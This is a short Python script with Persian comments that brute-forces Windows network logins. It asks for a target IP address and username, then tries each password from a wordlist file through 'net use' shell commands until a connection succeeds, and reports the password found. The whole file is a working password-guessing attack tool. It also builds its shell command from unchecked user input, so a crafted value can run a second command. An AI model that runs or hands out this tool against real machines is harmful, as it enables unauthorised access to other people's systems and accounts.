import os
import shutil
from tqdm import tqdm
import banners

# مسیر فایل متنی که پسوردها در آن قرار دارند
password_file_path = 'passwords.txt'

# دریافت آدرس IP و نام کاربری از کاربر
banners.windows_login()
ip_address = input("Enter the IP address: ")
username = input("Enter the username: ")

# باز کردن فایل و خواندن پسوردها
with open(password_file_path, 'r') as file:
    passwords = file.readlines()

# متغیر کمکی برای بررسی پیدا شدن پسورد
password_found = False

# تابع برای نمایش باکس
def print_box(message):
    columns = shutil.get_terminal_size().columns
    box_width = columns - 4
    print()
    print(f'╔{"═" * box_width}╗')
    print(f'║{" " * box_width}║')
    print(f'║{message.center(box_width)}║')
    print(f'║{" " * box_width}║')
    print(f'╚{"═" * box_width}╝')

# اجرای دستور برای هر پسورد تا زمانی که اتصال موفقیت‌آمیز باشد
for password in tqdm(passwords, desc="Trying passwords"):
    password = password.strip()  # حذف کاراکترهای اضافی مانند \n
    tqdm.write(f'Trying password: {password}')  # نمایش پسوردی که امتحان می‌شود
    command = f'net use \\\\{ip_address} /user:{username} {password} >nul 2>&1'
    result = os.system(command)

    if result == 0:  # اگر اتصال موفقیت‌آمیز بود
        print_box(f'Password found: {password}')
        os.system(f'net use \\\\{ip_address} /delete >nul 2>&1')
        password_found = True
        break

if not password_found:
    print_box('Password not found!')
